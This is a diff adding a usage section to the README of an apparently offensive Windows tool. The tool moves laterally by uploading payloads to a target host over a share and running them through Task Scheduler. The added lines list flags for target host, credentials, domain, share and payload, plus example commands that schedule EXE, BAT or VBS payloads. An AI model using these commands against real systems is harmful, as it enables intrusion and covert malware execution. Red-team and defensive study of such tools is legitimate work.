@@ -21,7 +21,21 @@ In general, this tool will allow both users and administrators to push malicious
 - moving laterally under the radar with some enhancement in Task Scheduling Library taskschd.dll 
 - supports all windows operating systems.
 - supports automatic exploitation or custom data and time task scheduling.
+## usage 
 
+```
+-h --remote hostname or IP Address.
+-u --valid username for authentication
+-p --valid account password 
+-d --specify Domain name FQDN
+-s --share folder or driver e.g c,d,admin,user,uploads..etc
+-c --select local payload as executable format or script to upload into target host
+-t --[OPTIONAL] use this option in order to run the payload at specific date and time
+Example: Z:\home\zux0x3a\Revenant\project1.exe -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS]
+ 
+Manual Task: Z:\home\zux0x3a\Revenant\project1.exe -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS] -t (2020\09\11 13:00:00)
+
+```
 ## Community 
 
 the project developed by Lawrence amer with much thanks to Lazarus Forums for imported Libraries to make this tool much powerful.
